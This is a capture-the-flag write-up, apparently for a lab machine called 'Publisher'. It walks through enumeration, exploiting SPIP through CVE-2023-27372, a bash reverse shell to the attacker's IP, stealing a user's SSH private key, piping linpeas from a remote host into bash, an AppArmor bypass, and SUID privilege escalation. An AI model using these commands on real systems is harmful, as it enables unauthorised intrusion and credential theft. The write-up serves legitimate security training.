




Enumeration
nmap
We start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}.

-sC: run all the default scripts.

-sV: Find the version of services running on the target.

-T4: Aggressive scan to provide faster results.


```
Nmap scan report for 10.10.16.40
 Host is up (0.097s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Web
Let’s check the website.


![image](https://github.com/user-attachments/assets/88eb3c30-693d-4126-a487-678a845fb8d0)

Nothing looks interesting here and the links doesn’t go anywhere.

Let’s run a directory scan.


```
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.4
───────────────────────────┬──────────────────────                                                       
 🎯  Target Url            │ http://10.10.16.40   
 🚀  Threads               │ 50                    
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 👌  Status Codes          │ All Status Codes!                                                                                                                                                                     
 💥  Timeout (secs)        │ 7                                                                           
 🦡  User-Agent            │ feroxbuster/2.10.4                                                          
 🔎  Extract Links         │ true                                                                        
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       32l      224w    17917c http://10.10.16.40/images/ads.jpg
200      GET      354l      770w     5959c http://10.10.16.40/style.css
200      GET      237l     1368w   110318c http://10.10.16.40/images/image_01.jpg
200      GET      142l      610w    69796c http://10.10.16.40/images/image_02.jpg
200      GET      150l      766w     8686c http://10.10.16.40/
301      GET        9l       28w      311c http://10.10.16.40/images => http://10.10.16.40/images/
301      GET        9l       28w      309c http://10.10.16.40/spip => http://10.10.16.40/spip/
```

We find /spip path, let’s check it out.

![image](https://github.com/user-attachments/assets/79dc9fad-78bc-473c-b6fe-5936924f44a0)



Nothing new here, I checked Wappalyzer and found the version of spip running is 4.2.0.



![image](https://github.com/user-attachments/assets/6d83eac2-5997-4116-8602-7605e1d5e8a6)



Searching on google we find this is vulnerable to Unauthenticated Remote Code Execution https://nvd.nist.gov/vuln/detail/CVE-2023-27372


I git cloned the project to my local machine using the below command


```
git clone https://github.com/Chocapikk/CVE-2023-27372.git             
Cloning into 'CVE-2023-27372'...                                                                                                    
remote: Enumerating objects: 25, done.                                                                                              
remote: Counting objects: 100% (14/14), done.                                                                                       
remote: Compressing objects: 100% (12/12), done.                                                                                    
remote: Total 25 (delta 4), reused 7 (delta 2), pack-reused 11                                                                      
Receiving objects: 100% (25/25), 14.20 KiB | 156.00 KiB/s, done.                                                                    
Resolving deltas: 100% (6/6), done.
```


Next i installed all the required libraries using the following command


```pip install -r requirements.txt```


![image](https://github.com/user-attachments/assets/e4f75854-0278-4aac-a7bf-e9079d248a9d)


To run the tool i used the following command



```
python CVE-2023-27372.py -u http://10.10.163.99/spip/ -v -o report.txt
```

Looking at the screenshot below we get remote code execution on the server


![image](https://github.com/user-attachments/assets/a949bd7d-2bf4-426c-a726-76072a9081f6)



Next is getting a reverse shell on the box and the command i used was

```
bash -c "bash -i >& /dev/tcp/10.8.84.177/9001 0>&1"
```




After setting up a netcat listener on port 9001 and we get a reverse shell



![image](https://github.com/user-attachments/assets/a563c167-31f6-4adb-b566-cd989a0879bf)



```

nc -nvlp 9001                                                      
listening on [any] 9001 ...                                                                                                         
connect to [10.8.84.177] from (UNKNOWN) [10.10.163.99] 58864                                                                        
bash: cannot set terminal process group (1): Inappropriate ioctl for device                                                         
bash: no job control in this shell                                                                                                  
www-data@41c976e507f8:/home/think/spip/spip$
```



We have a shell as the www-data user on the server and we seem to have landed on a docker container. Doing some manual enumeration we discover a SSH private key in think’s home directory and we have read access to the private key


![image](https://github.com/user-attachments/assets/c2dff48d-d254-48d7-9610-408a223b381d)



```
ls .ssh                                             
authorized_keys                                                                                                                                                                                                    
id_rsa                                                                                                                                                                                                             
id_rsa.pub                                          
cat .ssh/id_rsa                                                                                          
-----BEGIN OPENSSH PRIVATE KEY-----                                                                      
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn                                   
NhAAAAAwEAAQAAAYEAxPvc9pijpUJA4olyvkW0ryYASBpdmBasOEls6ORw7FMgjPW86tDK                                   
uIXyZneBIUarJiZh8VzFqmKRYcioDwlJzq+9/2ipQHTVzNjxxg18wWvF0WnK2lI5TQ7QXc                                   
OY8+1CUVX67y4UXrKASf8l7lPKIED24bXjkDBkVrCMHwScQbg/nIIFxyi262JoJTjh9Jgx                                   
SBjaDOELBBxydv78YMN9dyafImAXYX96H5k+8vC8/I3bkwiCnhuKKJ11TV4b8lMsbrgqbY
[...]

```

We copy the key to our machine, give it the right permission and connect with it.

```
┌─[]─[10.9.4.213]─[sirius@parrot]─[~/ctf/thm/publisher]                                                                                                                                                            
└──╼ [★]$ ssh -i id_rsa think@10.10.16.40                                                                                                                                                                          
The authenticity of host '10.10.16.40 (10.10.16.40)' can't be established.                                                                                                                                         
ED25519 key fingerprint is SHA256:Ndgax/DOZA6JS00F3afY6VbwjVhV2fg5OAMP9TqPAOs.                                                                                                                                     
This key is not known by any other names.                                                                                                                                                                          Are you sure you want to continue connecting (yes/no/[fingerprint])? yes                                                                                                                                           
Warning: Permanently added '10.10.16.40' (ED25519) to the list of known hosts.                                                                                                                                     
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-169-generic x86_64)                                                                                                                                                 
                                                                                                                                                                                                                   
 * Documentation:  https://help.ubuntu.com                                                                                                                                                                         
 * Management:     https://landscape.canonical.com                                                                                                                                                                 
 * Support:        https://ubuntu.com/advantage                                                                                                                                                                    

  System information as of Mon 30 Sep 2024 11:10:05 AM UTC

  System load:  0.08              Users logged in:                  0
  Usage of /:   75.8% of 9.75GB   IPv4 address for br-72fdb218889f: 172.18.0.1
  Memory usage: 16%               IPv4 address for docker0:         172.17.0.1
  Swap usage:   0%                IPv4 address for eth0:            10.10.16.40
  Processes:    175

  => There is 1 zombie process.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Feb 12 20:24:07 2024 from 192.168.1.13
think@publisher:~$

```

### think -> root ###


The intended way
I tried uploading linpeas but I got permission denied, so I just piped it to bash

```
curl 10.10.10.10/linpeas.sh|bash
```

![image](https://github.com/user-attachments/assets/829224f7-7509-49c4-8d18-a0fc50ab09f6)



We found an unknown binary with SUID bit.

We also see the apparmor is running which is likely to be the reason I wasn’t able to upload linpeas.


![image](https://github.com/user-attachments/assets/1cbef48a-ec8d-4c58-bd13-c17527ee8e0b)



Searching for ways to bypass apparmor I found this trick on hacktricks.


```
echo '#!/usr/bin/perl
use POSIX qw(strftime);
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh"' > /tmp/test.pl
chmod +x /tmp/test.pl
/tmp/test.pl
```
I wasn’t able to write to /tmp. We can check the rules at /etc/apparmor.d/usr.sbin.ash because the shell we are using is /usr/sbin/ash

```
think@publisher:/etc/apparmor.d$ cat usr.sbin.ash
#include <tunables/global>                                                                                                                                                                                         
                                                                                                                                                                                                                   
/usr/sbin/ash flags=(complain) {                                                                                                                                                                                   
  #include <abstractions/base>                                                                                                                                                                                     
  #include <abstractions/bash>      
  #include <abstractions/consoles>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>
                                                                                                                                                                                                                   
  # Remove specific file path rules
  # Deny access to certain directories
  deny /opt/ r,
  deny /opt/** w,
  deny /tmp/** w,
  deny /dev/shm w,
  deny /var/tmp w,
  deny /home/** w,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,

  # Simplified rule for accessing /home directory
  owner /home/** rix,
}
```
As we can see here that we can’t write in a lot of directories, even our own home directory.

We notice that /dev/shm and /var/tmp/ don’t have the wildcard *.

Let’s see if we can write to them

```

think@publisher:/dev/shm$ touch file
think@publisher:/dev/shm$ ls
file

```

Great! We can, let’s do the bypass trick now.

```

think@publisher:/dev/shm$ echo '#!/usr/bin/perl
> use POSIX qw(strftime);
> use POSIX qw(setuid);
> POSIX::setuid(0);
> exec "/bin/sh"' > /dev/shm/test.pl
think@publisher:/dev/shm$ ls -l
total 4
-rw-rw-r-- 1 think think  0 Sep 30 18:14 file
-rw-rw-r-- 1 think think 95 Sep 30 18:15 test.pl
think@publisher:/dev/shm$ chmod +x test.pl 
think@publisher:/dev/shm$ ./test.pl 
$ id
uid=1000(think) gid=1000(think) groups=1000(think)

```

Now let’s check the /usr/sbin/run_container binary.

```
$ /usr/sbin/run_container
List of Docker containers:
ID: 41c976e507f8 | Name: jovial_hertz | Status: Up 46 minutes

Enter the ID of the container or leave blank to create a new one: asdfsdf
/opt/run_container.sh: line 16: validate_container_id: command not found

OPTIONS:
1) Start Container
2) Stop Container
3) Restart Container
4) Create Container
5) Quit
```

When running the binary, we got prompt to enter an id of a container. I entered a random string and after that we can see that it’s running /opt/run_container.sh file.

```
$ ls -l /opt/run_container.sh
-rwxrwxrwx 1 root root 1715 Jan 10  2024 /opt/run_container.sh
```
Checking the file permission we see that we have write permissions over it.

I’ll write the following to the shell file that adds suid bit to /bin/bash

```
echo 'chmod +s /bin/bin/bash' > /opt/run_container.sh
```
Now we run the binary.

```$ /usr/sbin/run_container
$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
$ /bin/bash -p
bash-5.0# whoami
root
And we got root!
```

My way
When I found out I can’t write files to the target, I went back the www-data shell, I copied /bin/bash to /home/think/spip which was owned by www-data and gave it the suid bit. We also need to make it readable by everyone using chmod 777 .

```cd ..
pwd
/home/think/spip
cp /bin/bash .
chmod +s 
chmod 777 .
```
I went back to my ssh and runned /home/think/spip/bash -p which gave me a shell as www-data.

I found that the binary is running /opt/run_container.sh so I wrote the same bash command chmod +s /bin/bash to the file and ran the binary

![image](https://github.com/user-attachments/assets/53ae8c26-a233-4010-bebe-2637fbf6ff54)



Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).






